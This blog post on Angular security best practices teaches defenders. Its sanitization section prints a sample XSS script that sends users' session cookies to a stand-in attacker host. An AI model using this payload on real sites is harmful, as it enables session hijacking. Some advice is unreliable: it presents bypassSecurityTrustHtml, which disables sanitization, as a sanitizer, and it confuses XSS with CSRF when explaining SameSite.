---
layout: post
title: "Angular Security Best Practices"
author: Fredrick Kamau
categories: [Web Development, Angular, Security]
tags: [Angular, Security, Web Development]
description: "Essential security practices for Angular applications to protect against common vulnerabilities."
image: assets/images/angular-security.png
---

## Introduction
In today's digital world, ensuring the security of your web applications is not just a best practice but a necessity. In my [previous article](https://fredkamau.com/posts/web-security/), we talked about the most common web application security vulnerabilities that malicious users use to infiltrate systems such Cross-Site Scripting(XSS) and Cross Site Request Forgery(CSRF). Angular is one of the most popular front-end frameworks backed by Google. It provides robust tools and practices that helps protect your application on the client side. The following tips and tricks are the best practices to follow to ensure your angular app is bullet proof from cyber attacks:

**1. Keep Angular Up-to-Date**

The Angular team releases a new version of Angular every 6 months. The new version updates include important security patches that fixes known vulnerabilities that exposes your app to attacks. The latest angular version as of now is v20. Imagine your app is running on v12, there are so many security fixes that have been fixed by v20. Failure to upgrade your app to the latest stable version makes you a soft target to attackers. Also keep all your dependencies up to date and use trusted libraries.

**2. Sanitize User Input**

 Cross Site Script attacks occurs when a malicious user injects a script on the client side. When the  script executes it can access important information that can be used to impersonate a user. Angular comes with a built-in sanitization feature to mitigate this risk. It sanitizes user input and output, ensuring that any potentially dangerous content is escaped or removed. You should use string interpolations and property bindings and avoid using InnerHTML. For Example:

```javascript
<input [(ngModel)]="comments" />
<p [innerHTML]="comments"></p>
```
If comments are stored on the server side and a user submit this:
```javascript
Great product! <script>
    // Steal the user's session cookie and send it to the attacker's server
    var img = new Image();
    img.src = "http://attacker-site.com/steal?cookie=" + document.cookie;
</script>
```
When other users clicks on the comment, the scripts will be executed stealing the user’s cookies that might contain session tokens and other authentication data.
Safe usage:
```javascript
<p>{{ comments }}</p> 
```
Angular escapes characters like <, >, and &, preventing scripts from being executed.
Use [innerHTML] only if it's necessary and always use Angular's DOM sanitizers.

```javascript
this.comments = this.sanitizer.bypassSecurityTrustHtml(userInput);
```

**3. Implement Strong Authentication and Role-Based Authorization**

Authentication is used to verify the identity of a user and authorization is used to grant access to protected resources based on permissions/roles. Use of the traditional username/password authentication is often error prone/insecure. You should Instead use **OAuth 2.0 and OpenID Connect (OIDC)** which is a modern, well-supported and industry-standard protocols for authentication and authorization. In angular there is client libraries like [angular-auth-oidc-client](https://www.npmjs.com/package/angular-auth-oidc-client) that enables you to implement OAuth 2.0 and OpenID Connect flawlessly. Also make use of route guards to guarantee only authorized users or those who fulfill particular criteria can access sensitive or restricted portions of your application.

**4. Use Content Security policies(CSP)**

CSP is HTTP response header that tells the browser which resources such as JavaScript, CSS, Images, etc can be loaded and the URLs that they can be loaded from. It acts as a white list restricting: Scripts, Styles, Frame sources(iframe), connections(fetch, XHR and WebSocket) from executing in the browser even if they are injected. CSP is configured in the back-end using the Content-Security-Policy header. Example:

```javascript
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```
What does this mean?
* default-src 'self': Only allow loading resources from the same origin 
* script-src 'self': Only allow scripts from your domain 
* style-src 'self' 'unsafe-inline': Allow styles from your domain and inline styles (optional and risky 

**5. Use HTTPS for Secure Communication**

HTTPS is a secure version of HTTP. It uses Transport Layer Security(TLS) to encrypt the data exchanged between the client and the server which prevents attackers from intercepting sensitive information. Without HTTPS attackers can intercept data like tokens, session cookies and login credentials.

**6. Secure Cookie Practices** 
Cookies are used to store session identifiers, auth tokens and user preferences. When cookies are not configured securely, they can be exposed to malicious users, stolen and hijacked. This exposes your app to Identity theft by use of Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF) attacks. However this can be mitigated by:
* Use of secure Cookie flags: The Secure flag ensures that cookies are only sent over HTTPS.
```javascript
Set-Cookie: token=abc123; Secure
```
It prevents cookie being sent in cleartext over HTTP.

* Use the SameSite Attribute: Set the SameSite cookie attribute to Strict or Lax to protect against Cross-Site Request Forgery (CSRF) attacks.

```javascript
Set-Cookie: token=abc123; SameSite=Strict
```
This attribute gives you control over your cookies, browsers will not send it in any cross-site requests. It’s only sent along with requests that originate from the same domain. In XSS attacks, the HTTP request will include a session cookie from a different domain, so the request will not go through.

**7.  Penetration Testing and Vulnerability Scanning** 
Make use of penetration testing tools such as Burp Suite and OWASP ZAP to simulate attacks and find vulnerabilities. These vulnerabilities can be patched immediately to prevent zero day attacks.


### Conclusion
Securing your angular app is not a one time task but an ongoing process. By following the above tips such as using HTTPS, proper form sanitization, use of OAuth and OpenID Connect for authentication and Authorization and regularly updating angular and it's dependencies will significantly protect your app from the ever-evolving landscape of cybersecurity threats.



